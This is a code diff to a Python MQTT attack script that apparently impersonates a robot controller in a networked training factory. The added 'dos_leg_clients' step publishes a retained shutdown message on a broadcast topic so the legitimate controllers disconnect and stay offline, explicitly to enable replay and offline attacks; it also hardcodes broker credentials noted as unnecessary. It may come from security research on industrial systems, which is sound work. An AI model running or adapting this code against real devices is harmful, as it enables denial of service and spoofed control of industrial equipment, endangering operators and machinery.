@@ -11,7 +11,6 @@ import socket
 import paho.mqtt.client
 import paho.mqtt.client as mqtt
 import scapy.all as scapy
-import scratch_2
 import globs
 
 from paramiko import SSHClient
@@ -113,7 +112,7 @@ def retrieve_from_stock(color, stock):
 def on_connect(client, *lis):
     # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
     [client.subscribe(x) for x in
-     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
+     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack", "f/i/stock")]
     logger.info("Subscription to all topics of interest done")
     time.sleep(0.1)
     # Now we publish our fir
@@ -535,9 +534,28 @@ def on_publish(client, userdata, msgid, *rest):
             client.user_data_set(77)
             logger.info("Acknowledgement received from SLD with code 2 | SLD ended")
 
+        case "dos_leg_clients":
+            # now we DoS all the TXTs to disconnect them from broker
+            # we have to do this so that the legitimate devices do not obstruct our replay tickets / offline attack
+            data = '{i command you to shut down}'
+            # we publish and set as retain. This way, even if the TXTs come back online, they will immediate go offline
+            client.publish("fl/broadcast", data, qos=1, retain=True)
+
+            logger.info("Legitimate clients now shut down")
+
+            threads_list['manual_on_message_trigger'][thread_counter['manual_on_message_trigger']].start()
+            logger.info("Order received from Dashboard via broker")
+
+            client.user_data_set("33d")
+
 def on_message(client, userdata, mqttmsg):
     global order_color
     mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json
+
+    if mqttmsg.topic == "f/i/stock" and not globs.is_stock_recorded:
+        globs.hbw_stock = mqttpayload
+        globs.is_stock_recorded = True
+        print("stock received. your addition here seems to work")
 
     if mqttmsg.topic == "f/o/order":
         globs.on_message_event_trigger = True
@@ -557,11 +575,8 @@ def on_message(client, userdata, mqttmsg):
         _ = globs.hbw_stock
         globs.hbw_stock = retrieve_from_stock(order_color, _)
 
-        threads_list['manual_on_message_trigger'][thread_counter['manual_on_message_trigger']].start()
-        logger.info("Order received from Dashboard via broker")
+        client.user_data_set("dos_leg_clients")
 
-
-        client.user_data_set("33d")
 
     if mqttmsg.topic == "fl/hbw/ack" and mqttpayload["code"] == 1:
         # ----------------
@@ -701,7 +716,7 @@ for i in range(10):
         threads_list['manual_on_message_trigger'].append(thread_manual_on_message_trigger)
 
 
-mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
+mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
 mqtt_connect.max_queued_messages_set(2)
 mqtt_connect.max_inflight_messages_set(1)
 mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without username/password
